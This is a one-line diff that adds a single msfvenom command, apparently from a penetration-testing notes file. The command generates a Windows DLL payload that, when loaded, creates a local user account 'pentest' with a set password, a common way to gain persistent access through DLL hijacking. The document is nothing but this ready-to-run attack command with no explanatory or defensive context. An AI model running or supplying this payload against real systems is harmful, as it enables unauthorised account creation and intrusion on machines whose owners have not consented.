@@ -1,0 +1,1 @@
+msfvenom -p windows/adduser USER=pentest PASS=P@55w0rd123 -f dll  > adduser.dll
